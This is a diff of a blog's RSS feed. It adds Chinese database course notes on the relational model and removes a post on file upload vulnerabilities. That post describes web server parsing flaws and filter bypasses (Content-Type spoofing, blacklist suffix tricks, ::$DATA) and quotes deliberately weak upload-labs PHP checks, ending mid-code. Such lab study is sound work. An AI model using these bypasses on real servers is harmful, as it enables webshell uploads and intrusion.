+&lt;li&gt;非主属性：不包含在任何侯选码中的属性称为非主属性（ Non-Prime attribute）或非码属性（Non-key attribute）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;三类关系&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;基本关系（基本表或者基表）&lt;/p&gt;
+&lt;p&gt;实际存在的表，是实际存储数据的逻辑表示&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查询表&lt;/p&gt;
+&lt;p&gt;查询结果对应的表&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;视图表&lt;/p&gt;
+&lt;p&gt;由基本表或者其他识图表导出的表，是虚表，不对应实际的数据&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;基本关系的性质&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;列是同质的&lt;/li&gt;
+&lt;li&gt;不同的列可以出自一个域&lt;br /&gt;
+其中每个列称为一个属性&lt;br /&gt;
+不同的属性要给与不同的属性名&lt;/li&gt;
+&lt;li&gt;列的顺序无所谓，列的次序可以任意交换&lt;/li&gt;
+&lt;li&gt;任意两个元组的候选码不能相同&lt;/li&gt;
+&lt;li&gt;行的顺序无所谓，行的次序可以任意交换&lt;/li&gt;
+&lt;li&gt;分量必须取原子值（最基本的）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;222-关系模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#222-关系模式&#34;&gt;#&lt;/a&gt; 2.2.2、关系模式&lt;/h3&gt;
+&lt;h4 id=&#34;什么是关系模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是关系模型&#34;&gt;#&lt;/a&gt; 什么是关系模型&lt;/h4&gt;
+&lt;p&gt;关系模式（型）&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;对关系的描述&lt;/li&gt;
+&lt;li&gt;静态的稳定的&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;关系（值）&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;关系模式在某一个时刻的状态或者内容&lt;/li&gt;
+&lt;li&gt;动态的，随时间变化的&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;关系是元组的集合，因此关系模式必须指出这个元组集合的结构，即它由哪些组成，这些属性来自哪些域，以及属性与域之间的映像关系。&lt;/p&gt;
+&lt;h4 id=&#34;定义关系模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#定义关系模型&#34;&gt;#&lt;/a&gt; 定义关系模型&lt;/h4&gt;
+&lt;p&gt;关系模式可以形式化的表示为：&lt;/p&gt;
+&lt;p&gt;​	R（U，D，DOM，F）&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;R       关系名&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;U       组成该关系的属性名集合&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;D       属性组 U 中属性所来自的域&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;DOM  属性向域的映象集合&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;F        属性间的数据依赖关系集合&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;关系定义模式通常可以简记为&lt;/p&gt;
+&lt;p&gt;R(U)&lt;/p&gt;
+&lt;p&gt;关系模式何关系往往统称为关系&lt;/p&gt;
+&lt;h4 id=&#34;关系模型的存储结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关系模型的存储结构&#34;&gt;#&lt;/a&gt; 关系模型的存储结构&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;关系模型的逻辑结构 - 表&lt;/li&gt;
+&lt;li&gt;关系模型的物理结构
+&lt;ol&gt;
+&lt;li&gt;有的关系数据库管理中一个表对应一个操作系统文件，将物理数据组织交给操作系统完成；&lt;/li&gt;
+&lt;li&gt;有的关系数据库系统从操作系统那里申请若干个大的文件，自己划分文件空间，组织表，索引等存储结构，并进行存储管理。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;223关系数据库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#223关系数据库&#34;&gt;#&lt;/a&gt; 2.2.3 关系数据库&lt;/h3&gt;
+&lt;p&gt;在一个给定的应用领域中，所有关系的集合构成一个关系数据库&lt;/p&gt;
+&lt;p&gt;关系数据库也有型和值之分&lt;/p&gt;
+&lt;h2 id=&#34;22关系操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22关系操作&#34;&gt;#&lt;/a&gt; 2.2 关系操作&lt;/h2&gt;
+&lt;h3 id=&#34;221-基本关系操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#221-基本关系操作&#34;&gt;#&lt;/a&gt; 2.2.1、基本关系操作&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;常用的关系操作
+&lt;ul&gt;
+&lt;li&gt;查询：选择、投影、连接、除、并、交、差、笛卡尔积&lt;/li&gt;
+&lt;li&gt;数据更新：插入、删除、修改&lt;/li&gt;
+&lt;li&gt;选择、投影、并、差、笛卡尔积是 5 种基本操作&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;关系操作的特点
+&lt;ul&gt;
+&lt;li&gt;集合操作方式：操作的对象和结果都是集合，一次一集合的方式&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;222-关系数据库语言的分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#222-关系数据库语言的分类&#34;&gt;#&lt;/a&gt; 2.2.2、关系数据库语言的分类&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;关系代数语言&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;用对关系的运算来表达查询要求&lt;/li&gt;
+&lt;li&gt;代表 ISBL&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;关系演算语言：用谓词来表达查询要求&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;元组关系演算语言&lt;br /&gt;
+谓词变元的基本对象是元组变量&lt;/p&gt;
+&lt;p&gt;代表：APLHA, QUEL&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;域关系演算语言&lt;/p&gt;
+&lt;p&gt;谓词变元的基本对象是域变量&lt;/p&gt;
+&lt;p&gt;代表：QBE&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;介于关系代数何关系演算之间的语言&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;代表 SQL&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;每一个 ISBL 语句都近似于关系代数表达式&lt;br /&gt;
+关系代数、关系演算语言均是抽象的查询语言，这些抽象的语言与具体的关系数据库管理系统中实现的实际语言并不完全一样。但它们能用作评估实际系统中查询语言能力的标准或基础。&lt;/p&gt;
+&lt;h2 id=&#34;23关系的完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23关系的完整性&#34;&gt;#&lt;/a&gt; 2.3 关系的完整性&lt;/h2&gt;
+&lt;h3 id=&#34;231-关系的三类完整性约束&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#231-关系的三类完整性约束&#34;&gt;#&lt;/a&gt; 2.3.1 关系的三类完整性约束&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;实体完整性何参照完整性&lt;br /&gt;
+关系模型必须满足的完整性约束条件，称为关系的两个不变性，应该由关系系统自动支持&lt;/li&gt;
+&lt;li&gt;用户定义完整性&lt;br /&gt;
+应用领域需要遵循的约束条件，体现了具体领域中的语义约束&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;232-实体完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#232-实体完整性&#34;&gt;#&lt;/a&gt; 2.3.2 实体完整性&lt;/h3&gt;
+&lt;p&gt;(1) 实体完整性规则是针对基本关系而言的。一个基本表通常对应现实世界的一个实体集。&lt;/p&gt;
+&lt;p&gt;(2) 现实世界中的实体是可区分的，即它们具有某种唯一性标识。&lt;/p&gt;
+&lt;p&gt;(3) 关系模型中以主码作为唯一性标识。&lt;/p&gt;
+&lt;p&gt;(4) 主码中的属性即主属性不能取空值。&lt;/p&gt;
+&lt;h3 id=&#34;233-参照完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#233-参照完整性&#34;&gt;#&lt;/a&gt; 2.3.3 参照完整性&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;关系间的引用&lt;/p&gt;
+&lt;p&gt;在关系模型中实体及实体间的联系都是用关系来描     述的，因此可能存在着关系与关系间的引用。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;外码&lt;br /&gt;
+外码：设 F 是基本关系 R 的一个或一组属性，但不是关系 R 的码。如果 F 与基本关系 S 的主码 Ks 相对应，则称 F 是基本关系 R 的外码。&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;基本关系R称为参照关系
+基本关系S称为被参照关系或目标关系&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;参照完整性规则&lt;br /&gt;
+若属性（或属性组）F 是基本关系 R 的外码，它与基本关系 S 的主码 Ks 相对应（基本关系 R 和 S 不一定是不同的关系），则对于 R 中每个元组在 F 上的值必须为：&lt;br /&gt;
+或者取空值（F 的每个属性值均为空值）&lt;br /&gt;
+或者等于 S 中某个元组的主码值&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;234-用户定义的完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#234-用户定义的完整性&#34;&gt;#&lt;/a&gt; 2.3.4 用户定义的完整性&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;针对某一具体关系数据库的约束条件，反映某一具体应用所涉及的数据必须满足的语义要求&lt;/li&gt;
+&lt;li&gt;关系模型应提供定义和检验这类完整性的机制，以便用统一的系统的方法处理它们，而不要由应用程序承担这一功能&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;24关系代数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#24关系代数&#34;&gt;#&lt;/a&gt; 2.4 关系代数&lt;/h2&gt;
+&lt;p&gt;关系代数&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;一种抽象的查询语言&lt;/li&gt;
+&lt;li&gt;用对关系的运算来表达查询&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;关系代数的三个要素&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;运算对象：关系&lt;/li&gt;
+&lt;li&gt;运算结果：关系&lt;/li&gt;
+&lt;li&gt;运算符：4 类&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;集合运算符（）&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MjMxNzQ3NTc2NjYucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220923174757666.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220923174757666&amp;quot; style=&amp;quot;zoom: 50%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;将关系看成元组的集合&lt;/li&gt;
+&lt;li&gt;运算是从关系的 “水平” 方向即行的角度来进行&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;专门的关系运算符 &amp;lt; img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MjMxNzUwMDc3ODYucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220923175007786.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220923175007786&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;不仅涉及行而且涉及列&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;关系代数运算的分类&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;传统的集合运算&lt;/p&gt;
+&lt;p&gt;并、差、交、广义笛卡尔积&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;专门的关系运算&lt;/p&gt;
+&lt;p&gt;选择、投影、连接、除&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+ ]]></description>
+        </item>
+        <item>
             <guid isPermalink="true">https://blog.xcu.icu/2022/10/24/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E6%90%AD%E5%BB%BA/</guid>
             <title>域环境基础和搭建</title>
             <link>https://blog.xcu.icu/2022/10/24/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E6%90%AD%E5%BB%BA/</link>
@@ -3200,242 +3138,6 @@ T（n)/f (n) 的极限值为不等于零的常数，则称 f (n) 是 T (n) 的�
     &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
 &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
 &lt;p&gt;整个内存申请释放的过程&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://blog.xcu.icu/2022/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid>
-            <title>文件上传小结</title>
-            <link>https://blog.xcu.icu/2022/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
-            <category term="Web" scheme="https://blog.xcu.icu/categories/Web/" />
-            <category term="文件上传" scheme="https://blog.xcu.icu/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" />
-            <pubDate>Mon, 24 Oct 2022 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;[TOC]&lt;/p&gt;
-&lt;h1 id=&#34;文件上传漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件上传漏洞&#34;&gt;#&lt;/a&gt; 文件上传漏洞&lt;/h1&gt;
-&lt;p&gt;在文件上传漏洞中，文件上传本身没什么问题，重点是文件上传到服务器后，服务器怎么解析上传的文件，上传漏洞的成因是开发者没有对用户上传的文件进行严格的过滤，攻击者可以上传危险文件&lt;/p&gt;
-&lt;h1 id=&#34;解析漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解析漏洞&#34;&gt;#&lt;/a&gt; 解析漏洞&lt;/h1&gt;
-&lt;p&gt;攻击者利用上传漏洞通常会与 web 容器的解析漏洞相结合，下面简单记录一下常见的 web 容器的解析漏洞&lt;/p&gt;
-&lt;h2 id=&#34;iis解析漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iis解析漏洞&#34;&gt;#&lt;/a&gt; IIS 解析漏洞&lt;/h2&gt;
-&lt;ol&gt;
-&lt;li&gt;iis 中当文件夹命名为【*.asa】或者【**.asp】时，其目录下的所有文件都会被当作 asp 文件来解析&lt;/li&gt;
-&lt;li&gt;当文件为 *.asp;1.jpg 时，IIS6.0 同样会将文件当作 asp 解析&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id=&#34;apache解析漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache解析漏洞&#34;&gt;#&lt;/a&gt; Apache 解析漏洞&lt;/h2&gt;
-&lt;p&gt;Apache 解析文件时有一个原则就是当碰到不认识的扩展名的时候会从后向前解析，知道遇到认识的为止，如果都不认识则会暴漏其源码&lt;/p&gt;
-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;其认识的文件扩展名在&amp;#x2F;conf&amp;#x2F;mime.types文件下记录&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221015200221694.png&#34; alt=&#34;image-20221015200221694&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;php-cgi解析漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php-cgi解析漏洞&#34;&gt;#&lt;/a&gt; PHP CGI 解析漏洞&lt;/h2&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1waHBjZ2ktZHc3aXI3Y245MGJpMjdhMmIzYm9td2pxNWMuZmk=&#34;&gt;在 php 的配置文件中 cgi.fi&lt;/span&gt;:x_pathinfo 在部分版本中默认开启，多数存在于 nginx 与 php 的组合中，当末尾文件不存在时，会向前递归解析&lt;/p&gt;
-&lt;h1 id=&#34;简单waf绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简单waf绕过&#34;&gt;#&lt;/a&gt; 简单 waf 绕过&lt;/h1&gt;
-&lt;p&gt;下面两张是 upload-labs 中的图，总结了文件上传常见 waf 的测试方法和绕过思路&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221015201545404.png&#34; alt=&#34;image-20221015201545404&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221015201347065.png&#34; alt=&#34;image-20221015201347065&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;想要绕过限制，首先要得知道，开发人员通常通过哪些方法防止文件上传漏洞&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;客户端验证：客户端使用 Javascript 检测，在文件未上传的时候就对文件进行检测&lt;/li&gt;
-&lt;li&gt;服务端验证：在服务端检查文件的 mime 类型，扩展名是否合法，检查文件内容等等&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h1 id=&#34;下面基于upload的绕过总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下面基于upload的绕过总结&#34;&gt;#&lt;/a&gt; 下面基于 upload 的绕过总结&lt;/h1&gt;
-&lt;h2 id=&#34;前端js绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前端js绕过&#34;&gt;#&lt;/a&gt; 前端 JS 绕过&lt;/h2&gt;
-&lt;h3 id=&#34;方法一&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法一&#34;&gt;#&lt;/a&gt; 方法一&lt;/h3&gt;
-&lt;p&gt;浏览器禁用 js 验证&lt;/p&gt;
-&lt;h3 id=&#34;方法二&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法二&#34;&gt;#&lt;/a&gt; 方法二&lt;/h3&gt;
-&lt;p&gt;用 burp 抓包修改&lt;/p&gt;
-&lt;p&gt;将后缀名改成 php&lt;/p&gt;
-&lt;h2 id=&#34;content-typemime绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#content-typemime绕过&#34;&gt;#&lt;/a&gt; Content-Type（mime）绕过&lt;/h2&gt;
-&lt;p&gt;所谓 Content-Type 就是互联网媒体类型也就是 MIME 类型，决定浏览器将以什么形式、什么编码读取这个文件&lt;/p&gt;
-&lt;p&gt;先判断我们用 POST 方式提交 (标签名为 submit) 的变量是否存在，如果存在，则接下来判断 upload 这个文件夹是否存在，如果存在则继续判断我们上传文件的文件类型，如果其文件类型为 image/jpeg 或者为 image/png 或者为 image/gif，那么让 temp_file 这个变量获取存储在服务器中文件的临时名称，然后让 img_path 这个变量为 upload+/+ 被上传文件的名称。再进行判断如果 move_uploaded_file () 函数返回 ture (也就是成功将文件移动到 img_path 路径下) 那么 is_upload 变量为 true，即上传成功&lt;/p&gt;
-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;$is_upload &amp;#x3D; false;
-$msg &amp;#x3D; null;
-if (isset($_POST[&amp;#39;submit&amp;#39;]))&amp;#x2F;&amp;#x2F;判断我们用POST方式提交(标签名为submit)的变量是否存在
-&amp;#123;
-    if (file_exists(UPLOAD_PATH)) &amp;#x2F;&amp;#x2F;判断upload这个文件夹是否存在
-    &amp;#123;
-        if (($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;type&amp;#39;] &amp;#x3D;&amp;#x3D; &amp;#39;image&amp;#x2F;jpeg&amp;#39;) || ($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;type&amp;#39;] &amp;#x3D;&amp;#x3D; &amp;#39;image&amp;#x2F;png&amp;#39;) || ($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;type&amp;#39;] &amp;#x3D;&amp;#x3D; &amp;#39;image&amp;#x2F;gif&amp;#39;)) &amp;#x2F;&amp;#x2F;判断我们上传文件的文件类型
-        &amp;#123;
-            $temp_file &amp;#x3D; $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
-            $img_path &amp;#x3D; UPLOAD_PATH . &amp;#39;&amp;#x2F;&amp;#39; . $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]&amp;#x2F;&amp;#x2F;upload+&amp;#x2F;+文件名
-            if (move_uploaded_file($temp_file, $img_path)) &amp;#x2F;&amp;#x2F;将文件移动到img_path路径下
-            &amp;#123;
-                $is_upload &amp;#x3D; true;
-            &amp;#125; else &amp;#123;
-                $msg &amp;#x3D; &amp;#39;上传出错！&amp;#39;;
-            &amp;#125;
-        &amp;#125; else &amp;#123;
-            $msg &amp;#x3D; &amp;#39;文件类型不正确，请重新上传！&amp;#39;;
-        &amp;#125;
-    &amp;#125; else &amp;#123;
-        $msg &amp;#x3D; UPLOAD_PATH.&amp;#39;文件夹不存在,请手工创建！&amp;#39;;
-    &amp;#125;
-&amp;#125;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;p&gt;isset ()，用于检测变量是否设置，并且不是 NULL。如果该变量存在且非空则返回 TRUE，否则返回 FALSE&lt;/p&gt;
-&lt;p&gt;file_exists ()，检查文件或目录是否存在。如果指定的文件或目录存在则返回 true，否则返回 false。&lt;/p&gt;
-&lt;p&gt;move_uploaded_file (), 将上传的文件移动到新位置若成功，则返回 true，否则返回 false。&lt;/p&gt;
-&lt;p&gt;$FILES，FILES 是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $*FILES 为二维数组；如果为多个文件上传，那么 $*FILES 为三维数组。_&lt;/p&gt;
-&lt;p&gt;$_FILES&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjc0My5odG1sIw==&#34;&gt;&#39;userfile&#39;&lt;/span&gt; 客户端文件的原名称。&lt;/p&gt;
-&lt;p&gt;$_FILES&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjc0My5odG1sIw==&#34;&gt;&#39;userfile&#39;&lt;/span&gt; 文件的 MIME 类型，需要浏览器提供该信息的支持，例如 “image/gif”。&lt;/p&gt;
-&lt;p&gt;$_FILES&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjc0My5odG1sIw==&#34;&gt;&#39;userfile&#39;&lt;/span&gt; 文件被上传后在服务端储存的临时文件名&lt;/p&gt;
-&lt;h3 id=&#34;绕过方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过方法&#34;&gt;#&lt;/a&gt; 绕过方法&lt;/h3&gt;
-&lt;p&gt;进行抓包，将 Content-Type 修改为允许上传的类型（image/jpeg、image/png、image/gif）三选一。&lt;/p&gt;
-&lt;h2 id=&#34;黑名单检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#黑名单检测&#34;&gt;#&lt;/a&gt; 黑名单检测&lt;/h2&gt;
-&lt;h3 id=&#34;特殊后缀绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#特殊后缀绕过&#34;&gt;#&lt;/a&gt; 特殊后缀绕过&lt;/h3&gt;
-&lt;p&gt;所谓黑名单就是限制了哪些不可以上传，除去黑名单上的限制都可以。所以我们只要构造黑名单之外的后缀名即可绕过&lt;/p&gt;
-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;$is_upload &amp;#x3D; false;
-$msg &amp;#x3D; null;
-if (isset($_POST[&amp;#39;submit&amp;#39;])) &amp;#123;
-    if (file_exists(UPLOAD_PATH)) &amp;#123;
-        $deny_ext &amp;#x3D; array(&amp;#39;.asp&amp;#39;,&amp;#39;.aspx&amp;#39;,&amp;#39;.php&amp;#39;,&amp;#39;.jsp&amp;#39;);&amp;#x2F;&amp;#x2F;定义数组
-        $file_name &amp;#x3D; trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);&amp;#x2F;&amp;#x2F;移除字符串两侧的空白字符
-        $file_name &amp;#x3D; deldot($file_name);&amp;#x2F;&amp;#x2F;删除文件名末尾的点
-        $file_ext &amp;#x3D; strrchr($file_name, &amp;#39;.&amp;#39;);&amp;#x2F;&amp;#x2F;查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符   
-        $file_ext &amp;#x3D; strtolower($file_ext); &amp;#x2F;&amp;#x2F;转换为小写
-        $file_ext &amp;#x3D; str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);&amp;#x2F;&amp;#x2F;去除字符串::$DATA
-        &amp;#x2F;&amp;#x2F;php在windows的时候如果文件名+&amp;quot;::$DATA&amp;quot;会把其之后的数据当成文件流处理，不会检测后缀名。 且保持&amp;quot;:: $DATA&amp;quot;之前的文件名   1.php::$DATA  &amp;#x3D;&amp;#x3D;1.php
-        $file_ext &amp;#x3D; trim($file_ext); &amp;#x2F;&amp;#x2F;收尾去空 
-
-        if(!in_array($file_ext, $deny_ext))&amp;#x2F;&amp;#x2F;搜索$deny_ext这个数组里的$file_ext，且有为真
-        &amp;#123;
-            $temp_file &amp;#x3D; $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
-            $img_path &amp;#x3D; UPLOAD_PATH.&amp;#39;&amp;#x2F;&amp;#39;.date(&amp;quot;YmdHis&amp;quot;).rand(1000,9999).$file_ext;            
-            if (move_uploaded_file($temp_file,$img_path)) &amp;#123;
